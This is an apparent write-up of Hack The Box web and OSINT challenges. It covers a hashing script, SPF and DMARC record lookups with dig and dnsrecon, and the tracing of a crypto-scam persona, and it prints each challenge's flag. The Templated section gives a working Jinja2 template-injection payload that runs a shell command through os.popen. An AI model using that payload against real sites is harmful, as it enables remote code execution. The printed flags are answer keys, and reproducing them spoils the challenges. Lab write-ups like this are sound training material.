# Challenges

## Web

### Emdee five for life 

[Emdee five for life](https://app.hackthebox.eu/challenges/Emdee-five-for-life)

Can you encrypt fast enough? Surely we need scripting here. A very simply python script capturing the webpage input, hashing the thing, and posting it back will give the flag. 

Flag: HTB{N1c3_ScrIpt1nG_B0i!}

### Templated

[Templated](https://app.hackthebox.eu/challenges/Templated)

Can you exploit this simple mistake? 

At first glance, one would think this supports a simple GET, so what's the big deal about this. After all, there are no apparent ways to send input to the server. The source code is simple two line HTML. However, if you look at `host/xyz`, you shall see the value displayed on the 404 page. A very simple misconfiguration, but deadly. Now on to craft a SSTI payload. SSTI can be confirmed through `http://..../{{3*3}}` and getting back a 9.

```s
{{ config.items() }}
{{ config.from_object('os') }}
{{"".__class__.__mro__[1].__subclasses__()[414].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```

## OSINT

The idea is to engage with data in publicy available domains to get a sense of the target in general.

### Easy Phish

[Easy Phish](https://app.hackthebox.eu/challenges/Easy-Phish)

```sh
Customers of secure-startup.com have been recieving some very convincing phishing emails, 
can you figure out why?
```
- The host is no longer accessible from public domain. This may mean it was moved or shut down.

- Internet archives, wayback machine has entries related ot his. It was indexed on Sept. 22, 2020 and has stuff like text/html and image/gif. Not that useful.

- `dnsrecon -d secure-startup.com` returns a TXT DNS record of the form

```s
TXT secure-startup.com v=spf1 a mx ?all - HTB{RIP_SPF_Always_2nd
```
A TXT resource record allows to match arbitrary text with a domain. The part within { is half the flag. From `v=spf1 a mx ?all`, this looks like a SFP (Sender policy framework) record, which is related to email authentication (the problem the challenge asks to solve in the first place).

- Using `dig secure-startup.com -t txt`

```s
;; ANSWER SECTION:
secure-startup.com.     445     IN      TXT     "v=spf1 a mx ?all - HTB{RIP_SPF_Always_2nd"
```
- The mails being recieved by the recipients are spoofs. Thereby, they may have failed the DMARC test. Thereby, it is essential to query those records too. Navigate to `mxtoolbox.com/` and query DMARC to see reporting and conformance of emails.

```s
v=DMARC1;p=none;_F1ddl3_2_DMARC}
```

Final flag: HTB{RIP_SPF_Always_2nd_F1ddl3_2_DMARC}

Better way

```s
dig TXT linuxincluded.com
dig TXT dkim._domainkey.linuxincluded.com
dig TXT _dmarc. linuxincluded.com
```
### Money Flowz

[Money Flowz](https://app.hackthebox.eu/challenges/Money-Flowz)


```sh
Frank Vitalik is a hustler, can you figure out where the money flows?
```
- Searching on the fellow, there comes a [twitter profile](https://twitter.com/frankvitalik). I am not sure if the person is the same that I am looking for. But the dates of the tweets are around the same time the challenge was released (10 months at the time of the writing). Then there's two reddit posts: [post1](https://www.reddit.com/user/frankvitalik/comments/goxkz7/whats_the_cleverest_scam_youve_seen_in_crypto/) and [post2](https://www.reddit.com/user/frankvitalik/comments/goxefp/incredible_scam_giveaway_you_can_get_free_coins/). This is exactly what I am looking for: this person is the HTB crypto enthusiast.

- Post 2 has a link for having free fake coins [Freecoinz](https://steemit.com/htb/@freecoinz/freecoinz)

```sh
Super Ethereum SCAM Giveaway
(?)Deposit 10X ETH to this address and get 20X ETH back!!(?)
0x1b3247Cd0A59ac8B37A922804D150556dB837699
you can get free coinz!
```
and a comment by the poster themselves:

```sh
Wow! I can't believe they are giving free coins into the ropsten net!
```
- Post 1 however takes one into the details of a crypto scam wherein someone leaked their private key in their address and honeypotted the users into trying to hack their ethereum. There's a bot watching the wallet, and as soon as Ethers come in, the bot takes them away.

Scammer [etherscan.io page](https://etherscan.io/address/0xb7605ddc0327406a7ac225b9de87865e22ac5927)

Details of the scam on [bitcoin forum](https://bitcointalk.org/index.php?topic=2237480.0)
